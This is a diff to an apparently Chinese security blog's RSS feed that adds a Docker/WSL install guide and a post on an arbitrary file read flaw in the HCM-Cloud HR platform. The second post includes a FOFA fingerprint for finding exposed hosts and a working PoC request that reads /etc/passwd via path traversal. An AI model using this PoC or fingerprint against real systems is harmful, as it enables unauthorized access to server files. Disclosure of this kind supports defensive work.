@@ -5,8 +5,54 @@
         <link>http://example.com</link>
         <description></description>
         <language>zh-CN</language>
-        <pubDate>Mon, 28 Oct 2024 16:33:09 +0800</pubDate>
-        <lastBuildDate>Mon, 28 Oct 2024 16:33:09 +0800</lastBuildDate>
+        <pubDate>Fri, 01 Nov 2024 14:49:55 +0800</pubDate>
+        <lastBuildDate>Fri, 01 Nov 2024 14:49:55 +0800</lastBuildDate>
+        <category>/img/wallhaven-139eq9.jpg</category>
+        <category>/img/aaa.png</category>
+        <category>/img/wallhaven-zye67g.jpg</category>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/11/01/docker%E5%AE%89%E8%A3%85/</guid>
+            <title>docker安装</title>
+            <link>http://example.com/2024/11/01/docker%E5%AE%89%E8%A3%85/</link>
+            <pubDate>Fri, 01 Nov 2024 14:49:55 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;docker安装&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker安装&#34;&gt;#&lt;/a&gt; docker 安装&lt;/h1&gt;
+&lt;h2 id=&#34;1-下载程序&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-下载程序&#34;&gt;#&lt;/a&gt; 1、下载程序&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://docs.docker.com/desktop/install/windows-install/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;下载 windows-x86_64 的即可。&lt;br&gt;
+下载完成后，别急着安装，电脑还需要打开一个功能。控制面板 -&amp;gt; 程序 -&amp;gt; 启动或关闭 Windows 功能开启红框中的功能，安装好后别着急重启，还有。。。&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241101145059.png&#34; alt=&#34;20241101145059&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;安装wsl&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安装wsl&#34;&gt;#&lt;/a&gt; 安装 WSL&lt;/h2&gt;
+&lt;p&gt;以管理员模式打开 PowerShell 或 Windows 命令提示符，输入 wsl --install 命令具体操作如下：&lt;br&gt;
+键盘按下 win+r 键，按下 ctrl+shift + 回车。win 键就是 ctrl 右边的四个小方块。&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241101145124.png&#34; alt=&#34;20241101145124&#34;&gt;&lt;br&gt;
+ 输入：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wsl --install&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241101150049.png&#34; alt=&#34;20241101150049&#34;&gt;&lt;br&gt;
+ 输入账号：&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241101150757.png&#34; alt=&#34;20241101150757&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;安装docker&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安装docker&#34;&gt;#&lt;/a&gt; 安装 docker&lt;/h2&gt;
+&lt;p&gt;打开下载好的 docker 文件，点击 ok 开始自动安装。&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241101145249.png&#34; alt=&#34;20241101145249&#34;&gt;&lt;br&gt;
+ 安装成功&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241101145340.png&#34; alt=&#34;20241101145340&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/10/31/HCM-Cloud%E4%BA%91%E7%AB%AF%E4%B8%93%E4%B8%9A%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E5%B9%B3%E5%8F%B0download%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</guid>
+            <title>HCM-Cloud云端专业人力资源平台download任意文件读取漏洞</title>
+            <link>http://example.com/2024/10/31/HCM-Cloud%E4%BA%91%E7%AB%AF%E4%B8%93%E4%B8%9A%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E5%B9%B3%E5%8F%B0download%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</link>
+            <pubDate>Thu, 31 Oct 2024 14:16:22 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;1-漏洞介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-漏洞介绍&#34;&gt;#&lt;/a&gt; 1、漏洞介绍&lt;/h1&gt;
+&lt;p&gt;HCM-Cloud 云端专业人力资源平台 download 任意文件读取漏洞&lt;/p&gt;
+&lt;h2 id=&#34;fofa&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fofa&#34;&gt;#&lt;/a&gt; fofa&lt;/h2&gt;
+&lt;p&gt;icon_hash=“-859381597”&lt;/p&gt;
+&lt;h2 id=&#34;poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#poc&#34;&gt;#&lt;/a&gt; poc&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /api/model_report/file/download?index=/&amp;amp;ext=/etc/passwd HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241031145132.png&#34; alt=&#34;20241031145132&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞来源&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞来源&#34;&gt;#&lt;/a&gt; 漏洞来源&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/nvV7_ZGDqSUZJ5FNEWDhKw&#34;&gt;https://mp.weixin.qq.com/s/nvV7_ZGDqSUZJ5FNEWDhKw&lt;/a&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://example.com/2024/10/28/%E6%96%B9%E6%AD%A3%E5%85%A8%E5%AA%92%E4%BD%93%E9%87%87%E7%BC%96%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8syn.do%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</guid>
             <title>方正全媒体采编系统存在syn.do信息泄露漏洞</title>
